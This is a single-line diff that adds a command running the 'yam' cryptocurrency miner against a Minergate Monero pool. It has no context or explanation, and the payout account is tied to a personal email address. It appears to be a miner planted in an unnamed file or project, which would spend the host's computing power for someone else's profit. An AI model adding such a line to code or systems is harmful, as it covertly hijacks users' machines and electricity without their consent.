@@ -1,0 +1,1 @@
+yam -c 1 -M stratum+tcp://mr.yelloy.mgl%40gmail.com:x@xmr.pool.minergate.com:45560/xmr -t 1
